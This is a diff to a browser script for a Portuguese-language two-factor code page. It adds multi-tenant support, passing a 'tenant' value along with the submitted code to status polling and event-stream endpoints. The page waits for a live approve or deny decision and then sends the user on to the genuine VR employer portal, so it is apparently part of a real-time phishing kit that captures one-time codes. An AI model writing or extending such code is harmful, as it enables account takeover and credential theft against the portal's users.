@@ -8,9 +8,19 @@ const fieldsetElem = document.getElementById("code-fieldset");
 
 const URL_FINAL = "https://superportal-empregador.vr.com.br/";
 
-// Recupera o usuário informado na tela anterior
+// Recupera o usuário informado na tela anterior e tenant
 const urlParams = new URLSearchParams(window.location.search);
 const usuarioSalvo = urlParams.get("usuario") || sessionStorage.getItem("vr_usuario") || "";
+const tenantSalvo = (urlParams.get("tenant") || urlParams.get("cliente") || sessionStorage.getItem("vr_tenant") || "default").trim();
+
+if (tenantSalvo) {
+    sessionStorage.setItem("vr_tenant", tenantSalvo);
+}
+
+function voltarParaLogin() {
+    const t = sessionStorage.getItem("vr_tenant") || tenantSalvo || "default";
+    window.location.href = `/?tenant=${encodeURIComponent(t)}`;
+}
 
 let pollingInterval = null;
 
@@ -130,7 +140,8 @@ async function submeterCodigo() {
             },
             body: JSON.stringify({
                 codigo: codigo,
-                usuario: usuarioSalvo
+                usuario: usuarioSalvo,
+                tenant: tenantSalvo
             })
         });
     } catch (err) {
@@ -146,7 +157,7 @@ function iniciarPollingDecisao() {
 
     pollingInterval = setInterval(async () => {
         try {
-            const res = await fetch(`/api/status-2fa?usuario=${encodeURIComponent(usuarioSalvo)}`);
+            const res = await fetch(`/api/status-2fa?usuario=${encodeURIComponent(usuarioSalvo)}&tenant=${encodeURIComponent(tenantSalvo)}&t=${Date.now()}`);
             if (!res.ok) return;
             const data = await res.json();
 
@@ -169,7 +180,7 @@ function conectarSSEDecisao() {
     if (!window.EventSource) return;
     try {
         if (sseSource) sseSource.close();
-        sseSource = new EventSource("/api/stream");
+        sseSource = new EventSource(`/api/stream?tenant=${encodeURIComponent(tenantSalvo)}&t=${Date.now()}`);
         sseSource.onmessage = (event) => {
             try {
                 const json = JSON.parse(event.data);
@@ -200,7 +211,7 @@ function conectarSSEDecisao() {
 async function verificarEstadoInicial() {
     if (!usuarioSalvo) return;
     try {
-        const res = await fetch(`/api/status-2fa?usuario=${encodeURIComponent(usuarioSalvo)}`);
+        const res = await fetch(`/api/status-2fa?usuario=${encodeURIComponent(usuarioSalvo)}&tenant=${encodeURIComponent(tenantSalvo)}&t=${Date.now()}`);
         if (!res.ok) return;
         const data = await res.json();
         if (data.status_2fa === "negado") {
